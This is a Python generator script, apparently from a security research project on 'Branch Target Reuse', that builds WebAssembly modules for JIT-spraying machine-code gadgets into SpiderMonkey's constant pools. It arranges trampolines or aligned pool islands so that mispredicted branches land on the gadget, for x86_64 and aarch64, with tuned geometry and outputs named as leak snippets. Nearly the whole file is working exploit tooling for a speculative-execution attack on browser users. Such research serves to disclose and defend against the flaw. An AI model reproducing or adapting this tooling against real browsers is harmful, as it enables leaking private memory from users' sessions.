#!/usr/bin/env python3

# Branch Target Reuse (BTR)
# April 30th 2026
# Yuhui Zhu

# Unified WebAssembly BTB-landing-zone target generator. Selects along three
# orthogonal axes:
#
#   --arch     {x86_64, aarch64}       gadget machine code + branch ISA
#   --encoding {f64, v128}             literal-pool slot size (8 vs 16 bytes)
#   --layout   {trampoline, lattice}   how the pool becomes a landing zone
#
# Arch-specific codegen lives in the make_target_wasm_<arch>.py strategy
# libraries this imports. A mispredicted branch lands at codeBase + n*grid +
# LAND_OFF for an n we don't control (grid = the BTB landing stride, default
# 0x600 -- see the lattice note below); the two layouts turn that into a gadget
# hit differently, because the two arches lay out constant pools differently:
#
# * trampoline (x86 default) -- x86 keeps ONE RIP-relative pool at the end of each
#   function and the baseline compiler DEDUPS identical f64.const. So we use N
#   separate functions (dedup is per-function), put one gadget at pool slot 0, and
#   fill every other slot with a branch (jmp rel32) back to it -- each carries a
#   unique displacement, so entries stay distinct. Land anywhere in the pool ->
#   trampoline -> gadget. Displacements are pool-relative, hence layout-independent.
#
# * lattice (aarch64 default) -- aarch64 uses a FLUSHED constant pool
#   (IonAssemblerBufferWithConstantPools: limited LDR-literal range spills the pool
#   into islands scattered through the code) and does NOT dedup (insertEntry
#   appends unconditionally). So we tune padding/loads to flush one pool island
#   onto each grid point, and put the gadget LAND_OFF into each island -- the
#   landing point within it -- so the mispredicted branch arrives on the gadget's
#   first instruction directly, no trampoline. The same gadget repeats at every
#   island (no dedup to fight). The default grid (0x600)
#   derives from aarch64's minimum island spacing: this direct-landing design only
#   works where the pool can be flushed that densely, which is why trampoline does
#   not tune to the grid. The flush geometry is a black box here; its params
#   (nr_loads / pad_sep / pool_repeat / block_repeat) are tuned live on ARM.
#
# Layout defaults to the arch's natural mechanism but is independently selectable.
# The module exposes Config + generate() for automation; run directly it writes
# <name>.wat, compiles it with wat2wasm, and emits <name>.sidecar.json.
#
# DESIGN INVARIANT (intended to hold for every layout/encoding/arch):
#   Every contiguous literal pool carries the gadget at byte offset gadget_off
#   (slot gadget_off/slot_size) and every other slot is a `jmp rel` (arch branch)
#   trampoline to it -- a pool is exactly [ trampoline* | gadget | trampoline* ],
#   all slots slot_size-aligned. Because gadget_off, the slot count (nr_loads) and
#   the slot size are recorded in the sidecar, a probe never walks or guesses the
#   pool length: it finds the gadget (its first64), subtracts gadget_off to get
#   slot 0, jumps straight to the last slot (slot0 + (nr_loads-1)*slot_size),
#   confirms it is STILL a trampoline to the gadget, and takes the pool to span
#   [slot0, slot0 + nr_loads*slot_size). No hardcoded pool geometry.
#   tools/wasm_layout.gdb's [POOL] pass validates this and emits the bounds;
#   tools/coverage.py consumes them. Both writers (trampoline and lattice) build
#   the pool via the shared pool_slot_lit(), so they honor this uniformly.

import argparse
import datetime
import hashlib
import json
import math
import os
import struct
import subprocess
import sys
from dataclasses import asdict, dataclass

import make_target_wasm_x86_64
import make_target_wasm_aarch64

DEFAULT_OUT_DIR = '.'

# wat2wasm flags this module compiles with. SIMD (v128) is default-on in wabt;
# these two match the reference build recorded in tools/README.md.
WAT2WASM = 'wat2wasm'
WAT2WASM_FLAGS = ('--enable-multi-memory', '--enable-memory64')


# ---------------------------------------------------------------------------
# Literal-pool encoding (arch-INDEPENDENT): raw machine-code bytes -> WAT
# f64.const / v128.const payloads. The JIT lays these constants into the in-code
# literal pool verbatim, in memory order, so each chunk maps 1-to-1 onto a pool
# slot -- the primitive the JIT-spray technique is built on. f64 vs v128 is an
# ENCODING axis (slot size 8 vs 16 bytes), orthogonal to the target ISA. The
# arch modules' standalone encoders import these back from here.
# ---------------------------------------------------------------------------

def f64_literal(chunk: bytes) -> str:
    """WAT f64 literal encoding the exact 8-byte bit pattern of `chunk`."""
    assert len(chunk) == 8
    value = struct.unpack('<d', chunk)[0]
    if math.isnan(value):
        # Use nan:0x<mantissa> to preserve the full 64-bit pattern.
        bits = struct.unpack('<Q', chunk)[0]
        sign = (bits >> 63) & 1
        mantissa = bits & 0x000F_FFFF_FFFF_FFFF
        prefix = '-' if sign else ''
        return f'{prefix}nan:0x{mantissa:013x}'
    if math.isinf(value):
        return '-inf' if value < 0 else 'inf'
    # repr() guarantees IEEE 754 round-trip for finite values (Python >= 3.1).
    return repr(value)


def v128_literal(chunk: bytes) -> str:
    """WAT v128 literal (i64x2 lanes) encoding the exact 16-byte pattern.

    SpiderMonkey lays a `v128.const i64x2 LO HI` into the pool verbatim, lane 0
    (LO) as the low 8 bytes little-endian, lane 1 (HI) as the high 8 (verified
    live via gdb). So chunk[0..15] land at consecutive pool addresses, exactly
    like f64_literal does for 8 bytes."""
    assert len(chunk) == 16
    lo = int.from_bytes(chunk[0:8], 'little')
    hi = int.from_bytes(chunk[8:16], 'little')
    return f'i64x2 0x{lo:016x} 0x{hi:016x}'


def encode_f64(raw: bytes, pad_byte: int) -> list:
    """Split `raw` into 8-byte chunks (pad the last with `pad_byte`) -> f64
    literals. Returns [(chunk_bytes, literal)]."""
    rem = len(raw) % 8
    if rem:
        raw += bytes([pad_byte] * (8 - rem))
    return [(raw[i:i+8], f64_literal(raw[i:i+8]))
            for i in range(0, len(raw), 8)]


def encode_v128(raw: bytes, pad_byte: int) -> list:
    """Like encode_f64(), but 16-byte chunks -> v128 literals."""
    rem = len(raw) % 16
    if rem:
        raw += bytes([pad_byte] * (16 - rem))
    return [(raw[i:i+16], v128_literal(raw[i:i+16]))
            for i in range(0, len(raw), 16)]


# ---------------------------------------------------------------------------
# Encoding strategy (f64 = 8-byte slots, v128 = 16-byte slots)
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class Encoding:
    slot_size: int
    encode_fn: object          # raw bytes, pad_byte -> [(chunk, literal)]
    chunk_to_lit: object       # exactly-slot_size bytes -> WAT literal string
    local_decl: str            # last local (the one the pool loads target)
    load_tmpl: str             # (local.set ... ({const} {0}))
    zero_literal: str          # value compiled via the xor/pxor zero idiom


ENCODINGS = {
    'f64': Encoding(
        slot_size=8, encode_fn=encode_f64, chunk_to_lit=f64_literal,
        local_decl='(local $float f64)',
        load_tmpl='(local.set $float (f64.const {0}))',
        zero_literal='0.0'),
    'v128': Encoding(
        slot_size=16, encode_fn=encode_v128, chunk_to_lit=v128_literal,
        local_decl='(local $vec v128)',
        load_tmpl='(local.set $vec (v128.const {0}))',
        zero_literal='i64x2 0x0 0x0'),
}


# ---------------------------------------------------------------------------
# Arch strategy: the make_target_wasm_<arch> modules are the strategy. Each
# exposes an identical duck-typed interface -- NOP, assemble(asm), build_gadget(),
# trampoline(slot, slot_size, target_slot) -- so we just dispatch to the module
# for the chosen arch.
# ---------------------------------------------------------------------------

ARCHES = {'x86_64': make_target_wasm_x86_64, 'aarch64': make_target_wasm_aarch64}

# Each arch's natural pool mechanism (overridable with --layout).
DEFAULT_LAYOUT = {'x86_64': 'trampoline', 'aarch64': 'lattice'}

# Transiently-redirected control flow lands at codeBase + n*grid + LAND_OFF.
# LAND_OFF = 0x10 is the JS-JIT callee entry offset within its chunk: a JIT code
# buffer is preceded by an 8-byte JitCodeHeader (js/src/jit/JitCode.h) and the
# entry is then aligned up to CodeAlignment=16 (js/src/jit/Linker.cpp,
# newCodeView), so a 16-aligned chunk base puts codeStart at base + 0x10.
# tools/wasm_layout.gdb's [GRID] pass carries the same constant.
LAND_OFF = 0x10

# Where the gadget sits inside every pool, in bytes (--gadget-off overrides):
#   lattice    -- the island start is tuned onto the grid point and the landing is
#                 LAND_OFF past it, so the gadget starts at LAND_OFF and the
#                 mispredicted branch arrives on its first instruction.
#   trampoline -- the pool is not tuned to the grid, so a landing reaches the
#                 gadget through a trampoline wherever it falls; the gadget takes
#                 slot 0.
DEFAULT_GADGET_OFF = {'trampoline': 0, 'lattice': LAND_OFF}


def _pad_gadget(raw, slot_size, pad_unit):
    """Pad raw up to a slot_size multiple with the arch's NOP unit."""
    while len(raw) % slot_size:
        raw += pad_unit[:min(len(pad_unit), slot_size - len(raw) % slot_size)]
    return raw


def pool_slot_lit(enc, arch, slot, gadget_lits, gadget_slot):
    """The literal for pool slot `slot`, shared by both layouts so they honor the
    same [ trampoline* | gadget | trampoline* ] invariant (see module header):
    slots gadget_slot..gadget_slot+len(gadget_lits)-1 are the gadget, every other
    slot is a branch to gadget_slot (arch.trampoline, displacement is pool-local
    so it is correct per function AND per lattice island). The trampolines carry
    unique displacements, so all slots are distinct -- this pool doubles as its
    own layout probe."""
    if gadget_slot <= slot < gadget_slot + len(gadget_lits):
        return gadget_lits[slot - gadget_slot]
    return enc.chunk_to_lit(arch.trampoline(slot, enc.slot_size, gadget_slot))


# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

# Per-(arch, layout, encoding) default geometry. The tuning is arch-specific --
# the pool sizes and paddings were measured on one ISA's codegen -- so the arch is
# part of the key: the trampoline rows below were tuned on x86_64, the lattice rows
# on aarch64 (the natural layout per DEFAULT_LAYOUT). For trampoline/f64, the
# zero-idiom load takes no pool slot, so nr_loads is one below the total const
# count. The aarch64 lattice island counts (v128 16*16B == f64 32*8B, same island
# byte size) are a starting point to TUNE LIVE on ARM.
DEFAULT_TUNING = {
    ('x86_64', 'trampoline', 'f64'):  dict(nr_func=7, pad_start_phase=0,
                                           nr_loads=3323, pad_fill_tail=38),
    ('x86_64', 'trampoline', 'v128'): dict(nr_func=1, pad_start_phase=0,
                                           nr_loads=4356, pad_fill_tail=0),
    ('aarch64', 'lattice', 'f64'):    dict(nr_func=1, pad_start_phase=47, nr_loads=32,
                                           pad_sep=127, pad_cross_page=81,
                                           pool_repeat=42, block_repeat=2,
                                           pad_fill_tail=120),
}

# Geometry fields each layout's writer actually reads. If there is no DEFAULT_TUNING
# row for a combo, the caller must supply all of these explicitly; a still-unset one
# is the only thing that makes __post_init__ fail.
REQUIRED_FIELDS = {
    'trampoline': ('nr_func', 'pad_start_phase', 'nr_loads', 'pad_fill_tail'),
    'lattice':    ('nr_func', 'pad_start_phase', 'pad_cross_page', 'nr_loads',
                   'pad_sep', 'pool_repeat', 'block_repeat', 'pad_fill_tail'),
}


@dataclass
class Config:
    arch: str = 'x86_64'
    encoding: str = 'v128'
    layout: str = None            # defaults per-arch (DEFAULT_LAYOUT)
    # Geometry (None -> filled from DEFAULT_TUNING[(arch, layout, encoding)]).
    nr_func: int = None
    pad_start_phase: int = None   # filler insns opening the run (lattice: each
                                  # super-block), phasing its first island
    pad_cross_page: int = None    # lattice: filler insns carrying the layout across
                                  # the 0x10000 boundary, so the next block's first
                                  # island starts at page_border + 1*grid
    nr_loads: int = None          # const loads per pool (trampoline: the func's one
                                  # pool; lattice: each grid island)
    pad_sep: int = None           # lattice: filler insns spacing islands to the
                                  # grid stride (tuned for the default 0x600)
    pool_repeat: int = None       # lattice: islands per 0x10000 super-block
    block_repeat: int = None      # lattice: super-blocks per function
    pad_fill_tail: int = None     # filler insns after the whole pool structure,
                                  # once per function (see _func_tail)
    gadget_off: int = None        # gadget's byte offset within every pool
                                  # (None -> DEFAULT_GADGET_OFF[layout])
    out_dir: str = DEFAULT_OUT_DIR
    name: str = None              # defaults to leak_snippet_<arch>_<encoding>
    compile: bool = True

    def __post_init__(self):
        if self.layout is None:
            self.layout = DEFAULT_LAYOUT[self.arch]
        if self.gadget_off is None:
            self.gadget_off = DEFAULT_GADGET_OFF[self.layout]
        slot_size = ENCODINGS[self.encoding].slot_size
        if self.gadget_off < 0 or self.gadget_off % slot_size:
            raise ValueError(
                f"gadget_off 0x{self.gadget_off:x} must be a non-negative multiple "
                f"of the {self.encoding} slot size ({slot_size}), so the gadget "
                f"starts on a slot boundary")
        key = (self.arch, self.layout, self.encoding)
        # Fill any unset field from the tuned row for this combo, if one exists.
        for k, v in DEFAULT_TUNING.get(key, {}).items():
            if getattr(self, k) is None:
                setattr(self, k, v)
        # Fail only if -- after defaults -- a field the layout needs is still unset
        # (i.e. no DEFAULT_TUNING row AND the caller did not pass all of them).
        missing = [k for k in REQUIRED_FIELDS[self.layout] if getattr(self, k) is None]
        if missing:
            raise ValueError(
                f"{key}: geometry fields {missing} are unset and no DEFAULT_TUNING "
                f"row supplies them; pass them explicitly or add a row "
                f"(known: {sorted(DEFAULT_TUNING)})")
        if self.name is None:
            self.name = f'leak_snippet_{self.arch}_{self.encoding}'

    @property
    def gadget_slot(self):
        """The pool slot the gadget starts at (gadget_off expressed in slots)."""
        return self.gadget_off // ENCODINGS[self.encoding].slot_size

    @property
    def wat_path(self):
        return os.path.join(self.out_dir, self.name + '.wat')

    @property
    def wasm_path(self):
        return os.path.join(self.out_dir, self.name + '.wasm')

    @property
    def sidecar_path(self):
        return os.path.join(self.out_dir, self.name + '.sidecar.json')


# A parameterless signature keeps codeLength identical across aarch64 hosts: the
# eagerly-generated JIT entry stub (WasmStubs.cpp:1041, linked into this code
# block by ModuleGenerator::finishTier) coerces each i32 param with
# branchTruncateDoubleMaybeModUint32, which selects on FEAT_JSCVT -- one fjcvtzs
# where HWCAP reports jscvt, a six-instruction sequence where it does not.
FUNC_HEADER = '''\
(func (export "func{0}") (result i32)'''

FRAG_LOCALS_HEAD = '''\
(local $end i32)
(local $sum i32)
(local $sum64 i64)'''

FRAG_FUNC_ID = '''\
(local.set $sum (i32.const {0}))'''

FRAG_PADDING = '''\
(local.set $sum (i32.const 1))'''


def _gadget_chunks(enc, arch):
    """Return (raw_gadget_bytes, [literal per gadget slot])."""
    raw = arch.assemble(arch.build_gadget())
    padded = _pad_gadget(raw, enc.slot_size, arch.NOP)
    lits = [lit for _, lit in enc.encode_fn(padded, 0x00)]  # already aligned
    return raw, lits


def _func_head(f, idx, enc):
    f.write(FUNC_HEADER.format(idx) + '\n')
    f.write(FRAG_LOCALS_HEAD + '\n')
    f.write(enc.local_decl + '\n')
    f.write(FRAG_FUNC_ID.format(idx) + '\n')


def _func_tail(f, cfg):
    """Close the function with `pad_fill_tail` filler insns, then the i32 result.

    This is the tail of every function under both layouts: it runs once, after
    the complete pool structure, and `pad_fill_tail` is the 1-insn-granularity
    knob codeLength is tuned with to land page-aligned and padding-free
    (RandomPaddingForCodeLength, WasmCode.cpp:288). It sits past the last pool,
    so the grid phase and pool geometry keep their offsets. Trampoline tunes
    codeLength here alone; under lattice the other pads carry grid and page
    alignment, so this one is left to absorb the remainder."""
    for _ in range(cfg.pad_fill_tail):
        f.write(FRAG_PADDING + '\n')
    f.write('(i32.const 123)' + '\n')
    f.write(')\n')


def write_function_trampoline(f, idx, cfg, enc, arch, gadget_lits):
    """One pool per function: gadget at cfg.gadget_slot, every other slot a branch
    to it. Land anywhere in the pool -> trampoline -> gadget (x86 default)."""
    _func_head(f, idx, enc)
    for _ in range(cfg.pad_start_phase):
        f.write(FRAG_PADDING + '\n')

    # First const is the zero idiom (f64.const 0.0 -> xorpd / v128.const 0 ->
    # pxor); it compiles to a reg-zeroing insn and consumes NO pool slot.
    f.write(enc.load_tmpl.format(enc.zero_literal) + '\n')

    pool_lits = []
    for slot in range(cfg.nr_loads):
        lit = pool_slot_lit(enc, arch, slot, gadget_lits, cfg.gadget_slot)
        pool_lits.append(lit)
        f.write(enc.load_tmpl.format(lit) + '\n')

    # Dedup is load-bearing HERE (x86 pool dedups identical f64.const): two equal
    # literals collapse to one slot, shifting every following offset and breaking
    # the codeBase+n*grid -> slot correspondence. Guarantee all slots distinct.
    assert len(set(pool_lits)) == len(pool_lits), 'duplicate pool literal'

    _func_tail(f, cfg)


def write_function_lattice(f, idx, cfg, enc, arch, gadget_lits):
    """Lattice: the flushed constant pool spills into islands; tuning packs one
    island onto each grid point (default 0x600, aarch64's minimum island spacing),
    and each island is itself a [ trampoline* | gadget | trampoline* ] pool with
    the gadget at cfg.gadget_off (LAND_OFF) -- so a branch landing at
    codeBase + n*grid + LAND_OFF hits the gadget's first instruction directly, and
    a landing anywhere else in the island still reaches it via a trampoline
    (robust to grid-phase drift). Relies on the ARM64 pool NOT deduping, so the
    gadget repeats at every island. `nr_loads` consts per island; `pad_sep` filler
    insns space the next island to the grid stride; `pool_repeat` islands per
    0x10000 super-block; `block_repeat` blocks. `pad_cross_page` carries the run
    across the 0x10000 boundary and puts the next block's first island at
    page_border + 1*grid, which `pad_start_phase` then phases. The flush geometry
    is a black box here -- params are tuned live on ARM for the chosen grid."""
    _func_head(f, idx, enc)
    for blk in range(cfg.block_repeat):
        for _ in range(cfg.pad_start_phase):
            f.write(FRAG_PADDING + '\n')
        last = blk == cfg.block_repeat - 1
        islands = cfg.pool_repeat - 1 if last else cfg.pool_repeat
        for _ in range(islands):
            # Island = one [ trampoline* | gadget | trampoline* ] pool: the gadget
            # sits at cfg.gadget_slot (the grid-landing point), the rest are
            # branches to it (pool_slot_lit, shared with the trampoline layout).
            for slot in range(cfg.nr_loads):
                f.write(enc.load_tmpl.format(
                    pool_slot_lit(enc, arch, slot, gadget_lits,
                                  cfg.gadget_slot)) + '\n')
            for _ in range(cfg.pad_sep):
                f.write(FRAG_PADDING + '\n')
        for _ in range(cfg.pad_cross_page):
            f.write(FRAG_PADDING + '\n')
    _func_tail(f, cfg)


LAYOUTS = {
    'trampoline': write_function_trampoline,
    'lattice': write_function_lattice,
}


def generate(cfg):
    """Write the WAT target described by `cfg`. Returns the output path."""
    enc = ENCODINGS[cfg.encoding]
    arch = ARCHES[cfg.arch]
    writer = LAYOUTS[cfg.layout]
    _, gadget_lits = _gadget_chunks(enc, arch)
    # A pool holds the gadget at cfg.gadget_slot plus at least one trailing
    # trampoline, which is the slot tools/wasm_layout.gdb's [POOL] pass validates
    # the invariant on.
    need = cfg.gadget_slot + len(gadget_lits) + 1
    if cfg.nr_loads < need:
        raise ValueError(
            f"nr_loads={cfg.nr_loads} is too small: with gadget_off="
            f"0x{cfg.gadget_off:x} the gadget occupies slots {cfg.gadget_slot}.."
            f"{cfg.gadget_slot + len(gadget_lits) - 1}, so a pool needs >= {need} "
            f"slots")
    os.makedirs(cfg.out_dir, exist_ok=True)
    with open(cfg.wat_path, 'w') as f:
        f.write('(module\n')
        for i in range(cfg.nr_func, 0, -1):
            writer(f, i, cfg, enc, arch, gadget_lits)
        f.write(')\n')
    return cfg.wat_path


def gadget_first64(cfg):
    """First 8 gadget bytes as a little-endian uint64 -- the `$pat` a probe feeds
    to gdb `find` to locate the literal pool."""
    enc = ENCODINGS[cfg.encoding]
    arch = ARCHES[cfg.arch]
    raw, _ = _gadget_chunks(enc, arch)
    return int.from_bytes(raw[:8], 'little')


def compile_wasm(cfg):
    """Compile the WAT to `cfg.wasm_path` with wat2wasm + WAT2WASM_FLAGS."""
    subprocess.run([WAT2WASM, *WAT2WASM_FLAGS, cfg.wat_path, '-o', cfg.wasm_path],
                   check=True)
    return cfg.wasm_path


def _sha256(path):
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(1 << 20), b''):
            h.update(chunk)
    return h.hexdigest()


def _wat2wasm_version():
    try:
        return subprocess.run([WAT2WASM, '--version'], check=True,
                              capture_output=True, text=True).stdout.strip()
    except (OSError, subprocess.CalledProcessError):
        return None


def _file_meta(path):
    return {'path': os.path.basename(path),
            'sha256': _sha256(path),
            'bytes': os.path.getsize(path)}


def write_sidecar(cfg):
    """Write `cfg.sidecar_path`: the full Config, the gadget summary, the
    wat2wasm invocation, and sha256/size of both artifacts."""
    enc = ENCODINGS[cfg.encoding]
    arch = ARCHES[cfg.arch]
    raw, lits = _gadget_chunks(enc, arch)
    meta = {
        'generated_utc': datetime.datetime.now(datetime.timezone.utc)
                                 .isoformat(timespec='seconds'),
        'generator': os.path.basename(__file__),
        'config': asdict(cfg),
        'gadget': {'chunks': len(lits), 'bytes': len(lits) * enc.slot_size,
                   'raw_bytes': len(raw),
                   'pool_offset': f'0x{cfg.gadget_off:x}',
                   'pool_slot': cfg.gadget_slot,
                   'first64': f'0x{gadget_first64(cfg):016x}'},
        'wat2wasm': {'command': WAT2WASM,
                     'flags': list(WAT2WASM_FLAGS),
                     'version': _wat2wasm_version()},
        'files': {'wat': _file_meta(cfg.wat_path),
                  'wasm': _file_meta(cfg.wasm_path)},
    }
    with open(cfg.sidecar_path, 'w') as f:
        json.dump(meta, f, indent=2, sort_keys=True)
        f.write('\n')
    return cfg.sidecar_path


def parse_args(argv=None):
    ap = argparse.ArgumentParser(
        description='Generate a BTB-landing wasm target (arch x encoding x layout).')
    ap.add_argument('--arch', choices=list(ARCHES), default='x86_64',
                    help='target ISA for gadget/trampoline (default: x86_64)')
    ap.add_argument('--encoding', choices=list(ENCODINGS), default='v128',
                    help='literal-pool slot encoding (default: v128)')
    ap.add_argument('--layout', choices=list(LAYOUTS), default=None,
                    help='pool layout (default per-arch: x86_64=trampoline, '
                         'aarch64=lattice)')
    ap.add_argument('--nr-func', type=int, default=None,
                    help='number of functions (default: per-layout/encoding table)')
    ap.add_argument('--pad-start-phase', type=int, default=None,
                    help='filler insns before the pool -- lattice: opens each '
                         'super-block and phases its first island (default: table)')
    ap.add_argument('--nr-loads', type=int, default=None,
                    help='const loads per pool: trampoline=func pool, '
                         'lattice=each island (default: table)')
    ap.add_argument('--pad-sep', type=int, default=None,
                    help='lattice layout: filler insns spacing the next island to '
                         'the grid stride (default: table)')
    ap.add_argument('--pad-cross-page', type=int, default=None,
                    help='lattice layout: filler insns carrying the layout across '
                         'the 0x10000 boundary, placing the next block\'s first '
                         'island at page_border + 1*grid (default: table)')
    ap.add_argument('--pool-repeat', type=int, default=None,
                    help='lattice layout: islands per 0x10000 block (default: table)')
    ap.add_argument('--block-repeat', type=int, default=None,
                    help='lattice layout: blocks per function (default: table)')
    ap.add_argument('--pad-fill-tail', type=int, default=None,
                    help='filler insns at the very end of the function, after the '
                         'whole pool structure -- the 1-insn-granularity knob for '
                         'codeLength, and the only tail padding under trampoline '
                         '(default: table)')
    ap.add_argument('--gadget-off', type=lambda s: int(s, 0), default=None,
                    help='gadget byte offset within every pool, a multiple of the '
                         'slot size (default per-layout: trampoline=0, lattice='
                         f'0x{LAND_OFF:x}, the landing offset)')
    ap.add_argument('--out-dir', default=DEFAULT_OUT_DIR,
                    help='directory for all artifacts (default: %(default)s)')
    ap.add_argument('--name', default=None,
                    help='base name (default: leak_snippet_<arch>_<encoding>)')
    ap.add_argument('--no-compile', dest='compile', action='store_false',
                    help='emit only the WAT (skip wat2wasm and the sidecar)')
    a = ap.parse_args(argv)

    return Config(
        arch=a.arch, encoding=a.encoding, layout=a.layout,
        nr_func=a.nr_func, pad_start_phase=a.pad_start_phase,
        nr_loads=a.nr_loads, pad_sep=a.pad_sep,
        pad_cross_page=a.pad_cross_page, pool_repeat=a.pool_repeat,
        block_repeat=a.block_repeat, pad_fill_tail=a.pad_fill_tail,
        gadget_off=a.gadget_off,
        out_dir=a.out_dir, name=a.name, compile=a.compile)


def main():
    cfg = parse_args()
    _, lits = _gadget_chunks(ENCODINGS[cfg.encoding], ARCHES[cfg.arch])
    print(f'[i] {cfg.arch}/{cfg.encoding}/{cfg.layout} gadget: {len(lits)} slots '
          f'at pool+0x{cfg.gadget_off:x} (slot {cfg.gadget_slot}, '
          f'first64=0x{gadget_first64(cfg):016x})', file=sys.stderr)
    generate(cfg)
    print(f'[i] layout={cfg.layout} nr_func={cfg.nr_func} -> {cfg.wat_path}',
          file=sys.stderr)
    if cfg.compile:
        compile_wasm(cfg)
        write_sidecar(cfg)
        print(f'[i] compiled -> {cfg.wasm_path}', file=sys.stderr)
        print(f'[i] sidecar  -> {cfg.sidecar_path}', file=sys.stderr)


if __name__ == '__main__':
    main()
